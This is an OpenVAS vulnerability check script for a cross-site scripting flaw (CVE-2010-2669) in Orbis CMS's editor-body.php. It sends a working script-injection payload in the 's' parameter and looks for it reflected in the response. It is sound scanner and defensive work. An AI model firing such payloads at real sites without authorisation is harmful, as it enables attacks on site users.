##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_orbis_cms_xss_vuln.nasl 8314 2018-01-08 08:01:01Z teissa $
#
# Orbis CMS 'editor-body.php' Cross Site Scripting Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (C) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow attackers to execute arbitrary
HTML and script code in a user's browser session in the context of an affected
site.

Impact Level: Application.";

tag_affected = "Orbis CMS version 1.0.2 and prior";

tag_insight = "The flaw is due to an input passed via the 's' parameter to
'admin/editors/text/editor-body.php', which is not properly sanitised before
being returned to the user.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "This host is running Orbis CMS and is prone to cross site scripting
vulnerability.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801404");
  script_version("$Revision: 8314 $");
  script_tag(name:"last_modification", value:"$Date: 2018-01-08 09:01:01 +0100 (Mon, 08 Jan 2018) $");
  script_tag(name:"creation_date", value:"2010-07-16 19:44:55 +0200 (Fri, 16 Jul 2010)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_cve_id("CVE-2010-2669");
  script_bugtraq_id(41390);
  script_name("Orbis CMS 'editor-body.php' Cross Site Scripting Vulnerability");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/40474");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/60087");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_orbis_cms_detect.nasl");
  script_require_ports("Services/www", 80);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}

include("http_func.inc");
include("version_func.inc");

## Get HTTP Port
orbisPort = get_http_port(default:80);
if(!get_port_state(orbisPort)){
  exit(0);
}

## Get Orbis CMS Path from KB
if(!dir = get_dir_from_kb(port:orbisPort, app:"Orbis/CMS/Ver")){
 exit(0);
}

# Try expliot and check response
sndReq = http_get(item:string(dir, '/admin/editors/text/editor-body.php?' +
                 's="><script>alert(123456789)</script>"'), port:orbisPort);
rcvRes = http_send_recv(port:orbisPort, data:sndReq);
if(rcvRes =~ "HTTP/1\.. 200" && "script>alert(123456789)</script>" >< rcvRes){
  security_message(orbisPort);
}
